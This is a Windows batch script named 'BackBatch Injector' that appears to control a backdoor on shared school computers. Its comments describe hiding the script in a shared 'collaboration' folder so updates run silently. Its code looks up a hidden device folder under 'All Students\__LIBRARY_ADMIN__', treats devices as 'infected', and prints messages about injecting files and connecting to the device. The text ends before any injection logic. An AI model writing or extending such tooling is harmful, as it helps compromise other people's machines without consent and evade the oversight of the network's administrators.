::: BackBatch Injector
::: By 1k0de

:::::: IMPORTANT ::::::
:: This file will be hidden in collaboration along with the "BackBatch Connection Establisher.bat"
:: This file must be opened user a "Injector Launcher.bat".
:: ----------------------------------------------------------
:: Why?
:: > This is done so the code is always stored in collaboration meaning I can update the whenever I want
:: and whenever they run the program it will run the updated version. (Since its stored in collaboration.)
::
:: > This also applies for the "BackBatch Connection Establisher.bat"
::
:: > TL;DR - The opener will always run the most updated version stored in collab.
:::::::::::::::::::::::

::Set up window
@echo off
title BackBatch Injection & cls


:::::::::::: Set Up Colors ::::::::::::
setlocal EnableDelayedExpansion

for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set ESC=%%b
)

set "DarkWhite=!ESC![90m"
set "Red=!ESC![91m"
set "Green=!ESC![92m"
set "Yellow=!ESC![93m"
set "Blue=!ESC![94m"
set "Purple=!ESC![95m"
set "Cyan=!ESC![96m"
set "White=!ESC![97m"
set "b_black=!ESC![100m"
set "b_red=!ESC![101m"
set "b_green=!ESC![102m"
set "b_yellow=!ESC![103;30m"
set "b_blue=!ESC![104m"
set "b_purple=!ESC![105m"
set "b_cyan=!ESC![106m"
set "b_white=!ESC![107m"
set "dark_red=!ESC![31m"
set "white_black=!ESC![7m"
set "red_black=!ESC![7;31m"
set "reset=!ESC![0m"
set "bold=!ESC![1m"
set "underline=!ESC![4m"

set "wait=ping localhost -n 2 > nul"
set "_info=!reset![!Blue!INFO!reset!]"
set "_success=!reset![!Green!SUCCESS!reset!]"
set "_error=!reset![!Red!ERROR!reset!]"

set "_deviceStorage=P:\Composite\All Students\__LIBRARY_ADMIN__\"

cls
GOTO device
:::::::::::::::::::::::::::::::::::::::

:::::::::::: Enter Device Function ::::::::::::
:device
echo.
set "_d="
echo !reset![!b_red!Enter Device!reset!]
set /p "_d=> "
echo.
GOTO _load
:::::::::::::::::::::::::::::::::::::::::::::::

:_load
ping localhost -n 2 > nul
if exist "%_deviceStorage%\!_d!" (
	echo !_info! Found device files...
	goto begin_injection
)
echo !_error! Could not locate device files... Device may not be infected.
echo.
goto device

:begin_injection
echo !_info! Injecting files...
ping localhost -n 2 > nul
echo !_info! Attempting connection to device...
